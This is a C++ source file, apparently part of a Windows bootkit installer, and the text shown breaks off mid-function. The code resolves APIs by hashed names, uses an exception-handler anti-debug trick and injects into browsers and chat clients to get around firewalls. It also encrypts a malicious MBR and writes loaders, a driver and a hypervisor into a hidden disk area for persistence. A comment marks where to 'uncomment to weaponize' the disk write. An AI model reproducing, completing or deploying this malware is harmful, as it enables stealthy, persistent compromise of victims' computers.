#pragma warning(disable : 4477) // format string '%#x' requires an argument of type 'unsigned int'

#include "StealthNetwork.h"
#include "ModuleResolver.h"
#include "Utilities.h"
#include "FunctionTypedefs.h"
#include "AntiDebug.h"
#include "AsmLinkage.h"
#include "FsHeader.h"
#include "Meta.h"
#include "resource.h"

#include <functional>



//#include "..\..\..\Common\GrungeInitVector.h"
//#include "..\..\..\Common\CodebaseInitVector.h"

#include "..\..\..\Legacy Boot\export\Ldr16.h"
#include "..\..\..\Legacy Boot\export\Ldr32.h"
#include "..\..\..\Legacy Boot\export\Mbr.h"

#include "DebugHeader.h"


#pragma region Definitions

#define DEFINE_HASH(x, y) { (ULONG)&(x), (ULONG)(y) }
#define SELF_BASE         ((HMODULE)&__ImageBase)

#define TICK_DEVIATION    100
#define TICK_COUNT_MAX    500 // + TICK_COUNT_MIN
#define TICK_COUNT_MIN    500

#define GFUNCTION_OFFSET  0x8392530
#define EFI_MAGIC         0x5452415020494645  // 'EFI\x20PART'
#define PACKER_MAGIC      0xAAABACADAEAFBABB

#define STDCALL           __stdcall
#define VOLATILE          volatile


#define ALIGN_DOWN_BY(length, alignment) \
    ((ULONG_PTR)(length) & ~(alignment - 1))

#define ALIGN_UP_BY(length, alignment) \
    (ALIGN_DOWN_BY(((ULONG_PTR)(length) + alignment - 1), alignment))

#define FS_SECTOR_ALIGN(Size) ALIGN_UP_BY((Size), 0x200) / 0x200

#define REORDER_FS_GLOBALS(Size) \
	*CurrentSector -= FS_SECTOR_ALIGN((Size)); \
	*FsSize += FS_SECTOR_ALIGN((Size));

#define DEFINE_FUNCTION(Name, Ptr) \
	FpBlock->##Name = (fn##Name)Ptr;

typedef unsigned UNSIGNED;

/*** CRC32's of common networked applications ***/
static const unsigned long FirewallBypassTargets[] {
	0x7f976578, // chrome.exe
	0xdf64eefc, // firefox.exe
	0xb80800ba, // iexplore.exe
	0x319116b5, // Skype.exe
	0x786aa05a, // steamwebhelper.exe
	0x199a24e9, // Microsoft.VsHub.Server.HttpHost.exe
	0x5f40eb3b, // Discord.exe
	0x11a072a6, // GyStation.exe
	0xc073f97f, // opera.exe
	0xb52511fd, // MicrosoftEdge.exe
};


#pragma endregion
#pragma region Objects

#pragma pack(push)
typedef struct _CONFIG {
	UNSIGNED LoadIfPossible : 1;
	UNSIGNED InfectUefi : 1;
		
	UCHAR Heat32Url[256];
	UCHAR Heat64Url[256];
	UCHAR HyperDrive32Url[256];
	UCHAR HyperDrive64Url[256];
	UCHAR HeatKey[256];
	UCHAR HyperDriveKey[256];
	
	UCHAR C20[256];
	UCHAR C21[256];
	UCHAR C22[256];
	UCHAR C23[256];
	UCHAR C24[256];
	UCHAR C25[256];

} CONFIG, *PCONFIG;
typedef struct _PARTITION_ENTRY {
	UCHAR DriveStatus;
	UCHAR Head0;
	UCHAR Sector0;
	UCHAR Cylinder0;
	UCHAR PartitionType;
	UCHAR Head1;
	UCHAR Sector1;
	UCHAR Cylinder1;
	ULONG StartLba;
	ULONG NumberOfSectors;
} PARTITION_ENTRY, *PPARTITION_ENTRY;
typedef struct _FS_INFO {
	ULONGLONG CurrentSector;
	ULONGLONG FsSize;
	ULONGLONG VolumeSerialNumber;
	ULONGLONG VbrSector;
	PPARTITION_ENTRY CurrentPartition;
	HeatFileSystem *FileSystem;
} FS_INFO, *PFS_INFO;
typedef struct _LOADER_CONFIG {
	UNSIGNED UefiBoot : 1;
	UNSIGNED WildFireMode : 1;
	UNSIGNED p1 : 1;
	UNSIGNED p2 : 1;
	UNSIGNED p3 : 1;
	UNSIGNED p4 : 1;
	UNSIGNED p5 : 1;
	UNSIGNED p6 : 1;
	UCHAR Padding[511];
} LOADER_CONFIG, *PLOADER_CONFIG;

typedef struct _CALL_STUB {
	VOLATILE UCHAR CallStub[7];
	VOLATILE ULONG SavedEip;
	VOLATILE ULONG SavedEsp;
	VOLATILE PULONG CallOperandPointer;
} CALL_STUB, *PCALL_STUB;

#pragma pack(pop)

#pragma endregion
#pragma region Keys

static unsigned char ConfigKey[384] = {
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
};

#pragma endregion
#pragma region Globals


extern "C" IMAGE_DOS_HEADER __ImageBase;

class ScoutGlobals {
public:
	UNSIGNED Is64Bit : 1;
	UNSIGNED NetworkActive : 1;
	UNSIGNED ReportStatistics : 1;
	UNSIGNED UefiBoot : 1;
	VOLATILE UNSIGNED TransientDebugFlag : 1;
	VOLATILE UNSIGNED BlockCallCounter : 11;

	ModuleResolver *K32;
	ModuleResolver *NtDll;
	ModuleResolver *Advapi32;
	StealthNetwork *NetworkBlock;


	PVOID ExceptionHandlerHandle;
	PCONFIG Config;
	PLOADER_CONFIG LoaderConfig;

	ULONG RandomSeed;
	PWCHAR SelfName;
	PWCHAR BootDisk;
	PFS_INFO FsInfo;

	PVOID HypervisorBase;
	ULONG HypervisorSize;

	PVOID HeatBase;
	ULONG HeatSize;

	PCALL_STUB CallStubInfo;


	PFUNCTION_POINTER_BLOCK FunctionPointers;

	/*** BLOCK BASED CALL DEFINITIONS ***/


	MetaBlockCall *DownloadComponents;
	MetaBlockCall *DecryptSelf;
	MetaBlockCall *BeginPartitionFileSystem;
	MetaBlockCall *CommitInfection;
	MetaBlockCall *RetrieveBootDisk;
	MetaBlockCall *CompletePartitionFileSystem;
	MetaBlockCall *CheckBitness;
	MetaBlockCall *DestroyHeaders;
	MetaBlockCall *TeardownNetworkBlock;
	MetaBlockCall *AllocateFileSystem;
	MetaBlockCall *BuildNetworkBlock;
	MetaBlockCall *AdjustTokens;
	MetaBlockCall *UnpackConfig;
	MetaBlockCall *ResolveFunctionPointers;
	MetaBlockCall *CheckIfUefi;


	

	ScoutGlobals(std::function<void()> *LambdaOut);
	MetaBlockCall *SwitchBlockCall();
};


static ScoutGlobals *Globals;

#pragma endregion
#pragma region Block Calls


BOOLEAN STDCALL AllocateFunctionPointers(ScoutGlobals *Globals) {
	BOOLEAN Status = FALSE;
	fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)Globals->K32->ResolveFunctionByCrc(0x721bcb25);
	fnRtlAddVectoredExceptionHandler pRtlAddVectoredExceptionHandler = (fnRtlAddVectoredExceptionHandler)Globals->NtDll->ResolveFunctionByCrc(0xbaaf3cbd);
	fnFlushInstructionCache pFlushInstructionCache = (fnFlushInstructionCache)Globals->K32->ResolveFunctionByCrc(0xa8214bf1);

	Globals->FunctionPointers = (PFUNCTION_POINTER_BLOCK)pVirtualAlloc(NULL, sizeof(FUNCTION_POINTER_BLOCK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Globals->FunctionPointers == NULL)
		goto ExitPoint;

	Globals->FunctionPointers->VirtualAlloc = pVirtualAlloc;
	Globals->FunctionPointers->RtlAddVectoredExceptionHandler = pRtlAddVectoredExceptionHandler;
	Globals->FunctionPointers->FlushInstructionCache = pFlushInstructionCache;
	Globals->FunctionPointers->VirtualProtect = (fnVirtualProtect)Globals->K32->ResolveFunctionByCrc(0xc1bd16e8);

	DebugPrint("ALLOC FUNCTION POINTERS SUCCESS\r\n");
	DebugPrint("FlushInstructionCache: %#x\r\n", Globals->FunctionPointers->FlushInstructionCache);
	DebugPrint("VirtualAlloc: %#x\r\n", Globals->FunctionPointers->VirtualAlloc);
	DebugPrint("RtlAddVectoredExceptionHandler: %#x\r\n", Globals->FunctionPointers->RtlAddVectoredExceptionHandler);
	DebugPrint("VirtualProtect: %#x\r\n", Globals->FunctionPointers->VirtualProtect);

	Status = TRUE;

ExitPoint:
	return Status;
};
LONG CALLBACK TransientDebugHandler(PEXCEPTION_POINTERS ExceptionPointers) {
	PVOID ExceptionAddress = ExceptionPointers->ExceptionRecord->ExceptionAddress;
	ULONG ExceptionCode = ExceptionPointers->ExceptionRecord->ExceptionCode;
	PCONTEXT Context = ExceptionPointers->ContextRecord;

	Context->Dr0 = 0;
	Context->Dr1 = 0;
	Context->Dr2 = 0;
	Context->Dr3 = 0;

	if (ExceptionCode == EXCEPTION_BREAKPOINT)
		goto ExitPoint;

	// todo: need to time execution transition to exception handler

	if (ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
		if (Globals->TransientDebugFlag) {
			if ((ULONG)ExceptionAddress - (ULONG)Globals->CallStubInfo->CallStub == 5) {
				ULONG Function = 0;

				Context->Eip = Globals->CallStubInfo->SavedEip;
				Globals->CallStubInfo->SavedEip = 0;

				Function = *Globals->CallStubInfo->CallOperandPointer;
				Function += (ULONG)Globals->CallStubInfo->CallStub + 5; // todo: overwrite this code with zeros


				if ((Context->Eax & 0xff) != 0) { // checking if al != 0 (function succeeded)
					Context->Eax = MAGIC_ADBG; // if so, don't put into infinite loop
			//		*Globals->CallStubInfo->CallOperandPointer = 0; // clear pointer
					DebugPrint("Block call success!\r\n");
				}
				else
					Globals->BlockCallCounter--; // so we execute the same function when looping from failure
			}
			else
			{
				MetaBlockCall *BlockCall = Globals->SwitchBlockCall();

				DebugPrint("Preparing execution for BLOCK_CALL at address: %#x\r\n", BlockCall->DecodePointer());

				*Globals->CallStubInfo->CallOperandPointer = (BlockCall->DecodePointer()) - (ULONG)Globals->CallStubInfo->CallStub - 5;
				Globals->CallStubInfo->SavedEip = Context->Eip + 2;
				Context->Eip = (ULONG)Globals->CallStubInfo->CallStub;

				Globals->FunctionPointers->FlushInstructionCache((HANDLE)-1, (LPCVOID)Globals->CallStubInfo->CallStub, 7);
			}
		}
		else
		{
			Context->Eip += 2;
			Context->Eax = MAGIC_ADBG;
		}

		return EXCEPTION_CONTINUE_EXECUTION;
	}

ExitPoint:
	return EXCEPTION_CONTINUE_SEARCH;
};
BOOLEAN STDCALL pDecryptSelf() {
	
	return TRUE;
};




VOID CDECL EncryptMbr(){
	UCHAR CipherConstant = Utils::Rand() & 0xff;
	PUCHAR ptr = NULL;

	for (ptr = (PUCHAR)InfectedMbr; ptr < InfectedMbr + InfectedMbrSize - 8; ptr++){
		if (*(ULONGLONG*)ptr == PACKER_MAGIC){
			ptr += 8;
			*ptr++ = CipherConstant;
			do
			{
				*ptr++ ^= CipherConstant;
			} while (*(ULONGLONG*)ptr != PACKER_MAGIC);
			break;
		}
	}

};
PVOID EncryptConfig(PCHAR Config) {
	PCHAR NewConfig = new CHAR[sizeof(CONFIG)]();
	if (NewConfig == NULL)
		return NULL;

	for (unsigned long i = 0; i < sizeof(CONFIG); i++)
		NewConfig[i] = (Config[i] ^ ((CHAR*)&Globals->FsInfo->VolumeSerialNumber)[i % 8]) + (i & 0xff);

	return NewConfig;
};
BOOLEAN CDECL AttachToRandomProcess(StealthNetwork *Network) {
	HANDLE Snapshot = INVALID_HANDLE_VALUE;
	BOOLEAN Status = FALSE;
	PROCESSENTRY32W ProcessEntry = { 0 };
	PFUNCTION_POINTER_BLOCK Fp = Globals->FunctionPointers;
	
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32W);
	Snapshot = Fp->CreateToolhelp32Snapshot(0x00000002, 0); // TH32CS_SNAPPROCESS
	if (Snapshot == INVALID_HANDLE_VALUE)
		goto ExitPoint;

	/*** FIRST PASS ***/

	if (!Fp->Process32FirstW(Snapshot, &ProcessEntry))
		goto ExitPoint;

	do {
		if (ProcessEntry.th32ProcessID == Utils::CurrentPid32())
			continue;

		for (unsigned long i = 0; i < _countof(FirewallBypassTargets); i++) {
			if (Utils::Crc(ProcessEntry.szExeFile, Utils::GetLength(ProcessEntry.szExeFile)) == FirewallBypassTargets[i]) {
				if (!Network->AttachProcess(ProcessEntry.th32ProcessID))
					break;
				else
				{
					Status = TRUE;
					goto ExitPoint;
				}
			}
		}
	} while (Fp->Process32NextW(Snapshot, &ProcessEntry));


	// todo: second pass should look for all processes at the current integrity level


ExitPoint:
	if (Snapshot != INVALID_HANDLE_VALUE)
		Fp->CloseHandle(Snapshot);

	return Status;
};
BOOLEAN CDECL LoadHeat() {
	BOOLEAN Status = TRUE;



ExitPoint:
	return Status;
};
BOOLEAN STDCALL pCommitInfection(){
	HeatFileSystem *Fs = Globals->FsInfo->FileSystem;
	BOOLEAN Status = FALSE;

	DebugPrint("Commiting infection\r\n");

	if (Globals->UefiBoot){
		// need to figure out how to infect on UEFI systems

		Globals->LoaderConfig->UefiBoot = TRUE;
		DebugPrint("SET UEFI BIT\r\n");
		Status = TRUE; // go for now
	}
	else
	{
		EncryptMbr();
		Fs->AddFile(0, (PVOID)InfectedMbr, InfectedMbrSize, "MBR");

		DebugPrint("WRITE MALMBR\r\n");

		// todo: overwrite vbr too

		Status = TRUE;
	}

	if (!Status)
		goto ExitPoint;

	if (Globals->Config->LoadIfPossible && !Globals->Is64Bit)
		Status = LoadHeat();

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pCompletePartitionFileSystem(){
	BOOLEAN Status = FALSE;
	PFS_INFO FsInfo = Globals->FsInfo;
	PULONGLONG CurrentSector = &FsInfo->CurrentSector;
	PULONGLONG FsSize = &FsInfo->FsSize;
	HeatFileSystem *Fs = FsInfo->FileSystem;

	Fs->AddFile(Fs->GetDataSectorEntry(DS_LDR_CNFG_LBA), (PVOID)Globals->LoaderConfig, sizeof(LOADER_CONFIG), "LOADERCONFIG");
	Fs->SetDataSectorEntry(DS_FS_SIZE, *FsSize);

//	if (!Fs->FlushChangesToDisk()) // todo: uncomment to weaponize
//		goto ExitPoint;

	DebugPrint("FLUSH DISK\r\n");

	Status = TRUE;

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pBeginPartitionFileSystem(){
	BOOLEAN Status = FALSE;
	PFS_INFO FsInfo = Globals->FsInfo;
	PULONGLONG CurrentSector = &FsInfo->CurrentSector;
	PULONGLONG FsSize = &FsInfo->FsSize;
	HeatFileSystem *Fs = FsInfo->FileSystem;

	PVOID MbrCacheBuffer = NULL;
	PVOID VbrCacheBuffer = NULL;
	ULONG MbrCacheSize = 1; // 1 sector
	ULONG VbrCacheSize = 16; // 16 sectors
	PVOID EncryptedConfig = NULL;


	if (!Globals->UefiBoot){ // legacy boot
		REORDER_FS_GLOBALS(Ldr16Size);
		Fs->SetDataSectorEntry(DS_LDR16_LBA, *CurrentSector);
		Fs->SetDataSectorEntry(DS_LDR16_SIZE, FS_SECTOR_ALIGN(Ldr16Size));
		Fs->AddFile(*CurrentSector, (PVOID)Ldr16Buffer, Ldr16Size, "LDR16");

		DebugPrint("WRITE LDR16\r\n");

		REORDER_FS_GLOBALS(Ldr32Size);
		Fs->SetDataSectorEntry(DS_LDR32_LBA, *CurrentSector);
		Fs->SetDataSectorEntry(DS_LDR32_SIZE, FS_SECTOR_ALIGN(Ldr32Size));
		Fs->AddFile(*CurrentSector, (PVOID)Ldr32Buffer, Ldr32Size, "LDR32");

		DebugPrint("WRITE LDR32\r\n");


		if (!(Status = Fs->ReadDiskRaw(0, MbrCacheSize * 0x200, &MbrCacheBuffer)))
			goto ExitPoint;

		DebugPrint("READ MBR\r\n");


		for (int i = 0; i < 4; i++){ // parse MBR partition table
			FsInfo->CurrentPartition = (PPARTITION_ENTRY)((PUCHAR)MbrCacheBuffer + (0x1be + 16 * i));
			if (FsInfo->CurrentPartition->DriveStatus == 0x80 && FsInfo->CurrentPartition->PartitionType == 0x07){ // DriveStatus==80h=valid drive, PartitionType==07h==ntfs partition
				FsInfo->VbrSector = (ULONGLONG)FsInfo->CurrentPartition->StartLba;

				DebugPrint("FOUND CURRENT PARTITION: #%d\r\n", i);

				break;
			}
		}


		if (!(Status = Fs->ReadDiskRaw(FsInfo->VbrSector, VbrCacheSize * 0x200, &VbrCacheBuffer)))
			goto ExitPoint;

		DebugPrint("READ VBR\r\n");


		FsInfo->VolumeSerialNumber = *(ULONGLONG*)((PUCHAR)VbrCacheBuffer + 0x48);

		DebugPrint("READ VSN: %llx\r\n", FsInfo->VolumeSerialNumber);


		REORDER_FS_GLOBALS(MbrCacheSize * 0x200);
		Fs->SetDataSectorEntry(DS_MBR_CACHE_LBA, *CurrentSector);
		Fs->AddFile(*CurrentSector, MbrCacheBuffer, MbrCacheSize * 0x200, "MBRCACHE");

		DebugPrint("WRITE MBR CACHE\r\n");


		REORDER_FS_GLOBALS(VbrCacheSize * 0x200);
		Fs->SetDataSectorEntry(DS_VBR_CACHE_LBA, *CurrentSector);
		Fs->AddFile(*CurrentSector, VbrCacheBuffer, VbrCacheSize * 0x200, "VBRCACHE");

		DebugPrint("WRITE VBR CACHE\r\n");

	}

	REORDER_FS_GLOBALS(sizeof(LOADER_CONFIG)); // allocate FS space for bootstrap config file, will write later, need to encrypt with volumeserialnumber
	Fs->SetDataSectorEntry(DS_LDR_CNFG_LBA, *CurrentSector);
	Fs->SetDataSectorEntry(DS_LDR_CNFG_SIZE, FS_SECTOR_ALIGN(sizeof(LOADER_CONFIG)));

	DebugPrint("ALLOC LDR CONFIG\r\n");

	EncryptedConfig = EncryptConfig((PCHAR)Globals->Config);

	DebugPrint("ENCRYPTED OP CONFIG\r\n");

	REORDER_FS_GLOBALS(sizeof(CONFIG));
	Fs->SetDataSectorEntry(DS_OP_CNFG_LBA, *CurrentSector);
	Fs->SetDataSectorEntry(DS_OP_CNFG_SIZE, FS_SECTOR_ALIGN(sizeof(CONFIG)));
	Fs->AddFile(*CurrentSector, EncryptedConfig, sizeof(CONFIG), "OPCONFIG");

	DebugPrint("ALLOC OP CONFIG\r\n");

	REORDER_FS_GLOBALS(Globals->HeatSize);
	Fs->SetDataSectorEntry(DS_DRVR_LBA, *CurrentSector);
	Fs->SetDataSectorEntry(DS_DRVR_SIZE, FS_SECTOR_ALIGN(Globals->HeatSize));
	Fs->AddFile(*CurrentSector, Globals->HeatBase, Globals->HeatSize, "HEAT");

	DebugPrint("ALLOC HEAT\r\n");

	REORDER_FS_GLOBALS(Globals->HypervisorSize);
	Fs->SetDataSectorEntry(DS_HPV_LBA, *CurrentSector);
	Fs->SetDataSectorEntry(DS_HPV_SIZE, FS_SECTOR_ALIGN(Globals->HypervisorSize));
	Fs->AddFile(*CurrentSector, Globals->HypervisorBase, Globals->HypervisorSize, "HYPERDRIVE");
	
	DebugPrint("ALLOC HYPERDRIVE\r\n");

	Status = TRUE;

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pGetIsUefi(){
	BOOLEAN Status = FALSE;
	PVOID SecondSector = NULL;

	if (!Globals->Is64Bit){
		Globals->UefiBoot = FALSE;
		Status = TRUE;
		
		DebugPrint("System is not 64 bit, no EFI support\r\n");

		goto ExitPoint;
	}


	if (Globals->FsInfo->FileSystem->ReadDiskRaw(1, 0x200, &SecondSector)){
		Globals->UefiBoot = *(ULONGLONG*)SecondSector == EFI_MAGIC;
		DebugPrint("Efi enabled: %s\r\n", Globals->UefiBoot == TRUE ? "Yes" : "No");

		Globals->FunctionPointers->VirtualFree(SecondSector, 0x200, MEM_RELEASE);
	}
	else
		goto ExitPoint;

	Status = TRUE;

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pUnpackConfig(){
	HGLOBAL ResourceData = NULL;
	HRSRC ResourceInfo = NULL;
	PVOID Resource = NULL;
	ULONG ResourceSize = NULL;
	PUCHAR ResolvedPayloadBase = NULL;
	PFUNCTION_POINTER_BLOCK Fp = Globals->FunctionPointers;

	DebugPrint("Unpacking config...\r\n");

	if ((ResourceInfo = Fp->FindResourceW(SELF_BASE, MAKEINTRESOURCE(IDR_CONFIG1), PreKeyedEncryptedStringW(L"CONFIG"))) == NULL)
		goto ExitPoint;

	DebugPrint("Found Config resource\r\n");

	if ((ResourceData = Fp->LoadResource(SELF_BASE, ResourceInfo)) == NULL)
		goto ExitPoint;

	DebugPrint("Loaded Config resource\r\n");

	if ((Resource = Fp->LockResource(ResourceData)) == NULL)
		goto ExitPoint;

	DebugPrint("Locked Config resource\r\n");

	ResourceSize = Fp->SizeofResource(SELF_BASE, ResourceInfo);
	ResolvedPayloadBase = new UCHAR[ResourceSize]();
	
	Utils::memcpy(ResolvedPayloadBase, Resource, ResourceSize);

	DebugPrint("Config key: %s\r\n", ConfigKey);

	Globals->Config = (PCONFIG)ResolvedPayloadBase;
	// todo: decrypt with rsa


	DebugPrint("UNPACK CONFIG\r\n");

	return TRUE;

ExitPoint:
	return FALSE;
};
BOOLEAN STDCALL pResolveFunctions(){
	BOOLEAN Status = FALSE;
	PFUNCTION_POINTER_BLOCK Fp = Globals->FunctionPointers;

	Fp->FindResourceW = (fnFindResourceW)Globals->K32->ResolveFunctionByCrc(0xc5a098a9);
	Fp->LoadResource = (fnLoadResource)Globals->K32->ResolveFunctionByCrc(0xe92a6e40);
	Fp->LockResource = (fnLockResource)Globals->K32->ResolveFunctionByCrc(0x326671ac);
	Fp->SizeofResource = (fnSizeofResource)Globals->K32->ResolveFunctionByCrc(0x12a283e5);
	Fp->IsWow64Process = (fnIsWow64Process)Globals->K32->ResolveFunctionByCrc(0xffeb4dcc);
	Fp->LoadLibraryW = (fnLoadLibraryW)Globals->K32->ResolveFunctionByCrc(0xb0c0ceb3);
	Globals->Advapi32 = new ModuleResolver((PVOID)Fp->LoadLibraryW(PreKeyedEncryptedStringW(L"Advapi32.dll")));
	Fp->RegGetValueW = (fnRegGetValueW)Globals->Advapi32->ResolveFunctionByCrc(0x48edd96b);
	Fp->VirtualFree = (fnVirtualFree)Globals->K32->ResolveFunctionByCrc(0xa6d44431);
	Fp->GetTickCount64 = (fnGetTickCount64)Globals->K32->ResolveFunctionByCrc(0x80c496cf);
	Fp->RtlRandomEx = (fnRtlRandomEx)Globals->NtDll->ResolveFunctionByCrc(0xf133c292);

	Fp->NtReadFile = (fnNtReadFile)Globals->NtDll->ResolveFunctionByCrc(0x41427973);
	Fp->NtWaitForSingleObject = (fnNtWaitForSingleObject)Globals->NtDll->ResolveFunctionByCrc(0x9c51830a);
	Fp->NtWriteFile = (fnNtWriteFile)Globals->NtDll->ResolveFunctionByCrc(0x517c55b7);
	Fp->NtDeviceIoControlFile = (fnNtDeviceIoControlFile)Globals->NtDll->ResolveFunctionByCrc(0x1d8aa027);
	Fp->NtCreateFile = (fnNtCreateFile)Globals->NtDll->ResolveFunctionByCrc(0x45330a39);
	Fp->NtCreateEvent = (fnNtCreateEvent)Globals->NtDll->ResolveFunctionByCrc(0xabd7d17a);
	Fp->RtlInitUnicodeString = (fnRtlInitUnicodeString)Globals->NtDll->ResolveFunctionByCrc(0x75722d16);
	Fp->AdjustTokenPrivileges = (fnAdjustTokenPrivileges)Globals->Advapi32->ResolveFunctionByCrc(0x4ce72044);
	Fp->OpenProcessToken = (fnOpenProcessToken)Globals->Advapi32->ResolveFunctionByCrc(0x157d4d40);
	Fp->CloseHandle = (fnCloseHandle)Globals->K32->ResolveFunctionByCrc(0xdb14a418);
	Fp->LookupPrivilegeValueW = (fnLookupPrivilegeValueW)Globals->Advapi32->ResolveFunctionByCrc(0x6f57cfb8);
	Fp->CreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)Globals->K32->ResolveFunctionByCrc(0x62327256);
	Fp->Process32FirstW = (fnProcess32FirstW)Globals->K32->ResolveFunctionByCrc(0x564403ab);
	Fp->Process32NextW = (fnProcess32NextW)Globals->K32->ResolveFunctionByCrc(0x6dd01e78);

	DebugPrint("FindResourceW: %#x\r\n", Fp->FindResourceW);
	DebugPrint("LoadResource: %#x\r\n", Fp->LoadResource);
	DebugPrint("LockResource: %#x\r\n", Fp->LockResource);
	DebugPrint("SizeofResource: %#x\r\n", Fp->SizeofResource);
	DebugPrint("IsWow64Process: %#x\r\n", Fp->IsWow64Process);
	DebugPrint("RegGetValueW: %#x\r\n", Fp->RegGetValueW);
	DebugPrint("VirtualFree: %#x\r\n", Fp->VirtualFree);
	DebugPrint("GetTickCount64: %#x\r\n", Fp->GetTickCount64);
	DebugPrint("RtlRandomEx: %#x\r\n", Fp->RtlRandomEx);
	DebugPrint("VirtualProtect: %#x\r\n", Fp->VirtualProtect);
	DebugPrint("NtReadFile: %#x\r\n", Fp->NtReadFile);
	DebugPrint("NtWaitForSingleObject: %#x\r\n", Fp->NtWaitForSingleObject);
	DebugPrint("NtWriteFile: %#x\r\n", Fp->NtWriteFile);
	DebugPrint("NtDeviceIoControlFile: %#x\r\n", Fp->NtDeviceIoControlFile);
	DebugPrint("NtCreateFile: %#x\r\n", Fp->NtCreateFile);
	DebugPrint("NtCreateEvent: %#x\r\n", Fp->NtCreateEvent);
	DebugPrint("RtlInitUnicodeString: %#x\r\n", Fp->RtlInitUnicodeString);
	DebugPrint("AdjustTokenPrivileges: %#x\r\n", Fp->AdjustTokenPrivileges);
	DebugPrint("OpenProcessToken: %#x\r\n", Fp->OpenProcessToken);
	DebugPrint("CloseHandle: %#x\r\n", Fp->CloseHandle);
	DebugPrint("LookupPrivilegeValueW: %#x\r\n", Fp->LookupPrivilegeValueW);
	DebugPrint("CreateToolhelp32Snapshot: %#x\r\n", Fp->CreateToolhelp32Snapshot);
	DebugPrint("Process32FirstW: %#x\r\n", Fp->Process32FirstW);
	DebugPrint("Process32NextW: %#x\r\n", Fp->Process32NextW);

	DebugPrint("RESOLVED FUNCTIONS\r\n");

	Status = TRUE;

//ExitPoint:
	return Status;
};
BOOLEAN STDCALL pGetIs64Bit(){
	BOOLEAN Status = FALSE;
